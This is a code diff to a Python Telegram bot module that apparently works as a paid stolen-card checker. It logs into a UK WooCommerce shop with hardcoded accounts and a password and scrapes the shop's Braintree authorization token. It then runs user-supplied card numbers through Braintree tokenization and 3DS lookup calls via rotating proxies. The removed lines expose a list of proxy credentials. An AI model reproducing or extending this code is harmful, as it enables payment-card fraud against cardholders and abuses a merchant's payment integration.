@@ -6,7 +6,6 @@ import base64
 import random
 import asyncio
 import traceback
-from collections import defaultdict
 import jwt
 import aiohttp
 import requests
@@ -15,23 +14,7 @@ from fake_useragent import UserAgent
 from EQUROBOT import app
 from config import OWNER_ID
 from EQUROBOT.core.mongo import has_premium_access 
-
-
-proxy_list = [
-    "purevpn0s4931691:jm3s6om1bfbd@prox-ae.pointtoserver.com:10799",
-    "tickets:proxyon145@162.212.170.77:12345",
-    "purevpn0s607365:5whkx7x6o7c1@prox-au.pointtoserver.com:10799",
-    "tickets:proxyon145@161.0.1.13:12345",
-    "purevpn0s4931691:jm3s6om1bfbd@prox-fi.pointtoserver.com:10799",
-    "tickets:proxyon145@23.94.251.13:12345",
-    "purevpn0s4931691:jm3s6om1bfbd@prox-vn.pointtoserver.com:10799",
-    "purevpn0s607365:5whkx7x6o7c1@prox-bh.pointtoserver.com:10799",
-    "purevpn0s4931691:jm3s6om1bfbd@prox-sg.pointtoserver.com:10799",
-    "purevpn0s607365:5whkx7x6o7c1@prox-ae.pointtoserver.com:10799",
-
-]
-def get_random_proxy():
-    return {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}
+from EQUROBOT.modules.TOOLS.proxies import proxies
 
 async def get_bin_info(bin_number):
     url = f"https://bins.antipublic.cc/bins/{bin_number}"
@@ -59,11 +42,7 @@ def is_au_valid(au):
     try:
         decoded_au = jwt.decode(au, options={"verify_signature": False})
         exp = decoded_au.get('exp')
-        if exp:
-            current_time = int(time.time())
-            if exp > current_time:
-                return True
-        return False
+        return exp and exp > int(time.time())
     except Exception as e:
         print(f"Error decoding 'au': {str(e)}")
         return False
@@ -92,20 +71,18 @@ async def check_card(card_info, message):
     session_data = load_session_data()
     if session_data and is_au_valid(session_data.get('au')):
         au = session_data['au']
-        print("Using cached 'au' value.")
     else:
-        print("Performing login to obtain new 'au' token...")
         acc = ['sophia534201@promail.fun', 'hunter227312@newmail.online']
         email = random.choice(acc)
         r = requests.session()
         headers = {'user-agent': user}
         response = r.post('https://hakko.co.uk/my-account/add-payment-method/', headers=headers)
+        
         nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
         if not nonce_match:
-            print("Failed to extract login nonce.")
             return "Failed to extract login nonce."
+        
         nonce = nonce_match.group(1)
-        print("Starting Login Extracted ✅", nonce)
         data = {
             'username': email,
             'password': 'qFjbaeWjjGEMz5bU',
@@ -113,22 +90,25 @@ async def check_card(card_info, message):
             '_wp_http_referer': '/my-account/add-payment-method/',
             'login': 'Log in',
         }
+        
         response = r.post('https://hakko.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+        
         nonce_matches = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
         if not nonce_matches:
             return "Failed to extract add-payment-method nonce."
-        nonce = nonce_matches[0]
+        
         enc_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
         if not enc_match:
             return "Failed to extract Braintree client token."
+        
         enc = enc_match.group(1)
         dec = base64.b64decode(enc).decode('utf-8')
         au_matches = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
         if not au_matches:
             return "Failed to extract authorization fingerprint."
+        
         au = au_matches[0]
-        session_data = {'au': au}
-        save_session_data(session_data)
+        save_session_data({'au': au})
 
     headers = {
         "accept": "*/*",
@@ -176,12 +156,12 @@ async def check_card(card_info, message):
     }
 
     try:
-        proxy = get_random_proxy()
+        proxy_url = await proxies()
         response = requests.post(
             "https://payments.braintree-api.com/graphql",
             headers=headers,
             json=json_data,
-            proxies=proxy,
+            proxies=proxy_url,
         )
         response_data = response.json()
 
@@ -265,7 +245,7 @@ async def check_card(card_info, message):
             f"https://api.braintreegateway.com/merchants/wcr3cvc237q7jz6b/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
             headers=lookup_headers,
             json=lookup_json_data,
-            proxies=proxy,
+            proxies=proxy_url,
         )
         lookup_response_data = lookup_response.json()
         msg = (
@@ -305,8 +285,7 @@ async def check_card(card_info, message):
             resp = "Unexpected response"
 
         execution_time = round(time.time() - start_time, 2)
-
-        final_response = (
+        return (
             f"{status}\n\n"
             f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
             f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 3DS Lookup\n"
@@ -317,19 +296,12 @@ async def check_card(card_info, message):
             f"𝗧𝗶𝗺𝗲 ⇾ {execution_time} **Seconds**\n"
             f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
         )
-
-        return final_response
-
     except Exception as e:
-        error_message = f"An error occurred: {str(e)}\n"
-        error_type = f"Error Type: {type(e).__name__}\n"
         traceback_details = traceback.format_exc()
-        full_error = error_message + error_type + traceback_details
+        print(traceback_details)
         return "An internal error occurred, please try again later."
-
-
+    
 card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")
-
 
 def extract_card_info(message):
     card_info = None
@@ -343,10 +315,10 @@ def extract_card_info(message):
     return card_info
 
 
+
 @app.on_message(filters.command("vbv", prefixes=[".", "/", "!"]))
 async def vbv_check_handler(client, message):
-    user_id = message.from_user.id
- 
+
     if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
         return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")
 
@@ -364,15 +336,13 @@ async def vbv_check_handler(client, message):
     except Exception as e:
         await processing_msg.edit_text(f"An error occurred: {str(e)}")
 
+
 @app.on_message(filters.command("mvbv", prefixes=[".", "/", "!"]))
 async def mvbv_check_handler(client, message):
     user_id = message.from_user.id
 
-    has_access, error_message, user_level = await has_premium_access(user_id, required_credits=1)
-    user_level = user_level if user_level else "Free User"
-    if not has_access:
-        await message.reply_text(error_message)
-        return
+    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
+        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")
 
     card_text = extract_card_info(message)
 
